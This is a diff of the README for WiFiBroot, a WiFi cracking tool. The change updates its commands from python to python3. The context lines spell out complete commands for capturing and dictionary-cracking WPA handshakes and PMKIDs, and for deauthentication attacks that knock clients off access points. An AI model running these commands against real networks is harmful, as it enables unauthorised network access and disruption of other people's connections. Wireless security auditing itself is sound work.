@@ -10,12 +10,12 @@ WiFiBroot is built to provide clients all-in-one facility for cracking WiFi (WPA
 WiFiBroot heavily depends on scapy. So, you would need scapy installed. Almost, every other library would likely be installed on your system. Make sure the version you install for scapy should be `<=2.4.0`. Newer versions are likely to throw some unknown errors.
 
 ```
-$ sudo pip install scapy==2.4.0
+$ sudo pip3 install scapy==2.4.0
 ```
 The script is supposed to be run under **sudo** but it will still work even if not run under the root mode. The basic necessary arguments are: 
 
 ```
-$ sudo python wifibroot.py -i [interface] -d /path/to/dictionary -m [mode]
+$ sudo python3 wifibroot.py -i [interface] -d /path/to/dictionary -m [mode]
 ``` 
 
 ## Documentation : ##
@@ -25,8 +25,8 @@ WiFiBroot uses modes to identify which attack you want to perform on your target
 ### Modes:
 ```
 Syntax:
-    $ python wifibroot.py [--mode [modes]] [--options]
-    $ python wifibroot.py --mode 2 -i wlan1mon --verbose -d /path/to/list -w pmkid.txt
+    $ python3 wifibroot.py [--mode [modes]] [--options]
+    $ python3 wifibroot.py --mode 2 -i wlan1mon --verbose -d /path/to/list -w pmkid.txt
 
 Modes:
     #     Description                                 Value
@@ -121,25 +121,25 @@ Options:
 
 To Capture 4-way handshake and crack MIC code: 
 ```
-$ python wifibroot.py --mode 1 -i wlan1mon --verbose -d dicts/list.txt -w output.cap 
+$ python3 wifibroot.py --mode 1 -i wlan1mon --verbose -d dicts/list.txt -w output.cap 
 ```
 To Capture and Crack PMKID:
 ```
-$ python wifibroot.py --mode 2 -i wlan1mon --verbose -d dicts/list.txt -w output.txt
+$ python3 wifibroot.py --mode 2 -i wlan1mon --verbose -d dicts/list.txt -w output.txt
 ```
 Offline Crack Handshake and PMKID:
 ```
-$ python wifibroot.py --mode 3 --type handshake --essid "TARGET ESSID" --verbose -d dicts/list.txt --read output.cap
-$ python wifibroot.py --mode 3 --type pmkid --verbose -d dicts/list.txt --read output.txt
+$ python3 wifibroot.py --mode 3 --type handshake --essid "TARGET ESSID" --verbose -d dicts/list.txt --read output.cap
+$ python3 wifibroot.py --mode 3 --type pmkid --verbose -d dicts/list.txt --read output.txt
 ```
 Deauthentication attack in various form: 
 ```
 # Ultimate Deauthentication attack: 
-$ python wifibroot.py --mode 4 -i wlan1mon -00 --verbose
+$ python3 wifibroot.py --mode 4 -i wlan1mon -00 --verbose
 # Disconnect All Clients from Acess Point:
-$ python wifibroot.py --mode 4 -i wlan1mon --ap [AP MAC] --verbose
+$ python3 wifibroot.py --mode 4 -i wlan1mon --ap [AP MAC] --verbose
 # Disconnect a Specific Client: 
-$ python wifibroot.py --mode 4 -i wlan1mon --ap [AP MAC] --client [STA MAC] --verbose
+$ python3 wifibroot.py --mode 4 -i wlan1mon --ap [AP MAC] --client [STA MAC] --verbose
 ```
 
 ## Support ##
